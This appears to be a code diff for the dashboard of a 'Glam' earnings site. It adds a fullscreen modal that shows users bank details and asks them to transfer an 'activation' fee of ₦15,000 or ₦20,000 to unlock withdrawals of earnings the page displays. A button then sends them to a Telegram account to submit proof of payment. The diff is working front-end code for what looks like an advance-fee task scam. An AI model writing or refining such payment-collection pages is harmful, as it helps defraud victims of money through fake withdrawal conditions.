@@ -428,6 +428,31 @@
             color: var(--glamour-gold);        
         }
 
+        /* NEW FULLSCREEN BANK DETAILS MODAL */
+        .bank-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #0a0a0a;
+            z-index: 3000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .bank-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(212, 175, 55, 0.3);
+            border-radius: 24px;
+            width: 100%;
+            max-width: 450px;
+            padding: 30px 24px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            position: relative;
+        }
+
         @media (max-width: 600px) {            
             .dashboard-container {                
                 max-width: 100%;                
@@ -538,43 +563,56 @@
         </button>
     </div>
 
-    <!-- UNIQUE POP-UP (ACCOUNT DETAILS REPLACEMENT) -->
+    <!-- FIRST MODAL (KEPT AS REQUESTED) -->
     <div class="activation-modal" id="activationModal">        
         <div class="activation-content">            
-            <div class="activation-icon"><i class="fas fa-university"></i></div>            
-            <h2 class="activation-title">Account Activation</h2>            
-            <p class="activation-message text-xs" id="modalMessage">Transfer the required setup fee to the designated account below to activate your system matrix modules.</p>            
+            <div class="activation-icon"><i class="fas fa-gem"></i></div>            
+            <h2 class="activation-title">Activate Your Glam Account</h2>            
+            <p class="activation-message" id="modalMessage">Complete your Glam Fee payment to unlock withdrawals and all Glam modules.</p>            
             
-            <div class="mt-4 mb-6 p-4 bg-black/60 border border-[#d4af37]/30 rounded-2xl text-left space-y-3">
-                <div>
-                    <span class="text-[10px] uppercase tracking-wider text-white/40 block">Bank Name</span>
-                    <span id="bankName" class="text-sm font-bold text-white tracking-wide">Fetching...</span>
-                </div>
-                <div>
-                    <span class="text-[10px] uppercase tracking-wider text-white/40 block">Account Number</span>
-                    <div class="flex justify-between items-center bg-white/5 px-3 py-2 rounded-xl border border-white/10 mt-1">
-                        <span id="accountNumber" class="text-base font-mono font-bold text-[#d4af37] tracking-widest">Fetching...</span>
-                        <button id="copyBtn" class="text-xs text-[#d4af37] hover:text-white transition-colors px-2 py-1 bg-[#d4af37]/10 rounded-lg">
-                            <i class="fas fa-copy"></i> Copy
-                        </button>
-                    </div>
-                </div>
-                <div>
-                    <span class="text-[10px] uppercase tracking-wider text-white/40 block">Account Name</span>
-                    <span id="accountName" class="text-sm font-bold text-white tracking-wide">Fetching...</span>
-                </div>
-                <div>
-                    <span class="text-[10px] uppercase tracking-wider text-white/40 block">Amount to Pay</span>
-                    <span id="modalAmount" class="text-base font-extrabold text-[#d4af37]">₦15,000</span>
-                </div>
-            </div>
-            
-            <button class="activate-now-btn" id="activateNowBtn">I Have Made The Transfer</button>            
+            <button class="activate-now-btn" id="activateNowBtn">Pay Glam Fee</button>            
             
             <div class="mt-4">
-                <a class="cancel-link" id="cancelModalLink">Close Matrix</a>            
+                <a class="cancel-link" id="cancelModalLink">Maybe later</a>            
             </div>
         </div>    
+    </div>
+
+    <!-- NEW SECOND FULLSCREEN BANK DETAILS MODAL -->
+    <div class="bank-modal" id="bankModal">
+        <div class="bank-card">
+            <button id="closeBankModal" class="absolute top-4 right-4 text-white/40 hover:text-white text-lg"><i class="fas fa-times"></i></button>
+            <div class="text-[#d4af37] text-4xl mb-3"><i class="fas fa-university"></i></div>
+            <h2 class="text-xl font-extrabold text-[#d4af37] uppercase tracking-wide mb-1">Direct Bank Transfer</h2>
+            <p class="text-xs text-white/60 mb-6">Transfer the exact activation fee to the account details below.</p>
+            
+            <div class="space-y-3 text-left bg-black/40 p-4 rounded-xl border border-white/10 mb-6">
+                <div>
+                    <span class="text-[10px] text-white/40 uppercase block">Bank Name</span>
+                    <span id="displayBankName" class="text-sm font-bold text-white tracking-wide">Fetching Bank...</span>
+                </div>
+                <div class="flex justify-between items-center">
+                    <div>
+                        <span class="text-[10px] text-white/40 uppercase block">Account Number</span>
+                        <span id="displayAccNum" class="text-lg font-black text-[#d4af37] tracking-wider">0000000000</span>
+                    </div>
+                    <button id="copyAccBtn" class="text-xs bg-[#d4af37]/10 text-[#d4af37] px-3 py-1.5 rounded-md border border-[#d4af37]/20 font-bold hover:bg-[#d4af37]/20 transition"><i class="fas fa-copy mr-1"></i> Copy</button>
+                </div>
+                <div>
+                    <span class="text-[10px] text-white/40 uppercase block">Account Name</span>
+                    <span id="displayAccName" class="text-sm font-bold text-white tracking-wide">Fetching Account Name...</span>
+                </div>
+                <div>
+                    <span class="text-[10px] text-white/40 uppercase block">Amount Due</span>
+                    <span id="displayAmountDue" class="text-sm font-bold text-emerald-400">₦15,000</span>
+                </div>
+            </div>
+
+            <button class="activate-now-btn bg-emerald-500 hover:bg-emerald-400 text-black mb-3 flex items-center justify-center gap-2" id="madeTransferBtn">
+                <i class="fab fa-telegram text-lg"></i> I Have Made Transfer
+            </button>
+            <p class="text-[10px] text-white/40">Send proof of transaction to our system logs for instant approval.</p>
+        </div>
     </div>
 
 <script type="module">
@@ -595,6 +633,9 @@
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
     const db = getFirestore(app);
+
+    // CHANGABLE TELEGRAM CONFIGURATION
+    const TELEGRAM_USERNAME = "YourTelegramUsername"; 
 
     let userPlanType = "regular";
 
@@ -632,18 +673,6 @@
         }
 
         try {
-            // Synchronize Dynamic Admin Bank Parameters Instantly
-            const bankDocRef = doc(db, "admin", "bankDetails");
-            const bankDocSnap = await getDoc(bankDocRef);
-            if (bankDocSnap.exists()) {
-                const bankData = bankDocSnap.data();
-                document.getElementById('bankName').textContent = bankData.bankName || "Unassigned";
-                document.getElementById('accountNumber').textContent = bankData.accountNumber || "Unassigned";
-                document.getElementById('accountName').textContent = bankData.accountName || "Unassigned";
-            } else {
-                console.warn("No bank document matrix created in admin panel.");
-            }
-
             const userDocRef = doc(db, "users", user.uid);
             const userDocSnap = await getDoc(userDocRef);
 
@@ -662,6 +691,11 @@
 
                 const isPlus = (userPlanType === 'prime');
 
+                // SYNC BANK METRICS INSTANTLY FROM THE ADMIN CONTROL DASHBOARD SCHEMA
+                document.getElementById('displayBankName').textContent = data.bankName || "Moniepoint";
+                document.getElementById('displayAccNum').textContent = data.accountNumber || "1234567890";
+                document.getElementById('displayAccName').textContent = data.accountName || "Glamour Media Enterprise";
+
                 // TRACKING AND UPDATING VALUES ACCORDING TO USER DATABASE SCHEMA
                 if (isPlus) {
                     document.getElementById('earningsAmount').textContent = '₦20,000';
@@ -670,7 +704,7 @@
                     document.getElementById('boostBadge').textContent = 'x15 BOOST';
                     document.getElementById('streamMessage').textContent = 'Join Livestreams on TikTok for x15 boost (Premium Plus benefit)';
                     document.getElementById('modalMessage').textContent = 'Activate your Glam Prime Plan account (₦20,000) to unlock VIP rewards, x15 boost and higher withdrawal limits.';
-                    document.getElementById('modalAmount').textContent = '₦20,000';
+                    document.getElementById('displayAmountDue').textContent = '₦20,000';
                 } else {
                     document.getElementById('earningsAmount').textContent = '₦15,000';
                     document.getElementById('planBadge').textContent = 'Regular Plan';
@@ -678,7 +712,7 @@
                     document.getElementById('boostBadge').textContent = 'x10 BOOST';
                     document.getElementById('streamMessage').textContent = 'Join Livestreams on TikTok for x10 boost on GlamStatus — paid in ₦';
                     document.getElementById('modalMessage').textContent = 'Complete your Glam Fee payment (₦15,000) to unlock withdrawals and all Glam modules.';
-                    document.getElementById('modalAmount').textContent = '₦15,000';
+                    document.getElementById('displayAmountDue').textContent = '₦15,000';
                 }
 
                 // If account is already processed and marked true, show full tracking data values
@@ -699,6 +733,8 @@
     });
 
     const modal = document.getElementById('activationModal');
+    const bankModal = document.getElementById('bankModal');
+
     const closeModal = () => { modal.style.display = 'none'; document.body.style.overflow = 'auto'; };
     const openModal = () => { modal.style.display = 'flex'; document.body.style.overflow = 'hidden'; };
     
@@ -706,24 +742,37 @@
     document.getElementById('cancelModalLink').addEventListener('click', closeModal);
     window.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
 
-    // Handle Quick Copy Module Functional Logic Instantly
-    document.getElementById('copyBtn').addEventListener('click', () => {
-        const num = document.getElementById('accountNumber').textContent;
-        if(num && num !== "Fetching..." && num !== "Unassigned") {
-            navigator.clipboard.writeText(num);
-            window.showGlamourAlert("Account details clipped safely.");
-        }
+    // ROUTING FIRST POPUP BUTTON TO TRIGGER DYNAMIC FULLSCREEN BANK MODAL
+    document.getElementById('activateNowBtn').addEventListener('click', () => {
+        modal.style.display = 'none';
+        bankModal.style.display = 'flex';
     });
 
-    document.getElementById('activateNowBtn').addEventListener('click', () => {
-        window.showGlamourAlert("Transfer submitted! Processing verification.");
-        closeModal();
+    // CLOSE FULLSCREEN BANK TRANSFER PANEL
+    document.getElementById('closeBankModal').addEventListener('click', () => {
+        bankModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    });
+
+    // CLIPBOARD PRO-COPY SYSTEM
+    document.getElementById('copyAccBtn').addEventListener('click', () => {
+        const accNum = document.getElementById('displayAccNum').textContent;
+        navigator.clipboard.writeText(accNum).then(() => {
+            showGlamourAlert("Account Number copied to clipboard!");
+        }).catch(() => {
+            showGlamourAlert("Copy protocol failed.", "error");
+        });
+    });
+
+    // TELEGRAM VERIFICATION LINK REDIRECT
+    document.getElementById('madeTransferBtn').addEventListener('click', () => {
+        window.location.href = `https://t.me/PriscaOfficialRegistrationTeam`;
     });
 
     document.getElementById('logout-panel-btn').addEventListener('click', async () => {
         try {
             await signOut(auth);
-            showGlamourAlert("Session  severed safely");
+            showGlamourAlert("Session severed safely.");
             setTimeout(() => { window.location.href = 'login.html'; }, 1500);
         } catch (err) {
             showGlamourAlert("Error running exit procedure.", "error");
